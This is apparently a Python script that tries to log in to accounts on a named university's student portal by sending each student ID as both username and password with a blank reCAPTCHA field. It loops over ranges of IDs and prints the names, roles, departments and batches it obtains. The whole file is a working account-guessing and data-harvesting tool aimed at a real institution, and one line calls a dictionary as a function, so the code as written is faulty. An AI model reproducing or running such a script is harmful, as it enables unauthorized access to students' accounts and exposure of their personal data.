import requests

def check(payload):
    headers = {
        "Content-Type": "application/json",
        "Origin": "http://studentportal.diu.edu.bd",
        "Referer": "http://studentportal.diu.edu.bd/",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
    }
    # studentId parameter should be provided as part of the URL
    params =  {"studentId": payload("password")}
    try:
        # Send the POST request
        url_login = "http://software.diu.edu.bd:8006/login"
        url_info = "http://software.diu.edu.bd:8006/result/studentInfo"
        response_login = requests.post(url_login, json=payload, headers=headers)
        response_info = requests.get(url_info, headers=headers, params=params)
        data_login = response_login.json()
        data_info = response_info.json()
        if data_login["message"] == "success":
            # Parse the response JSON
            # Print the response data_login
            print("\nLogin successful for:")
            print("Name:", data_login["name"])
            print("User Name:", data_login["userName"])
            print("Roles:", data_login["commaSeparatedRoles"])
            print("Device Name:", data_login["deviceName"])
        else:
            
            # Checking the response status code
            if response_info.status_code == 200:
            # Parsing the JSON response
                # Printing the response data_info
                print("Response:")
                print("Name:", data_info["name"])
                print("Student ID:", data_info["studentId"])
                print("Department:", data_info["department"])
                print("Batch:", data_info["batch"])
                # Add more fields as needed
            else:
    
                print(f"\nLogin failed for ID: {payload['username']}. Reason: {data_info['message']}")

    except Exception as e:
        print(f"\nAn error occurred while processing the request: {e}")

# Define the URL


choice = int(input("Enter '1' for a single search or '2' for a range-based search: "))

if choice == 1:
    Id = input("Please enter the ID: ")
    payload = {
        "username": f"{Id}",
        "password": f"{Id}",
        "grecaptcha": ""
    }
    check(payload)
elif choice == 2:
    Batch_code = input("Please enter the Batch Code: ")
    Dept_code = input("Please enter the Department Code: ")
    id_range_lower_bound = input("Please enter the Lower Bound ID: ")
    id_range_upper_bound = input("Please enter the Upper Bound ID: ")
    print("\nProcessing range-based search...")
    for id in range(int(id_range_lower_bound), int(id_range_upper_bound) + 1):
        payload = {
            "username": f"{Batch_code}-{Dept_code}-{str(id)}",
            "password": f"{Batch_code}-{Dept_code}-{str(id)}",
            "grecaptcha": ""
        }
        check(payload)
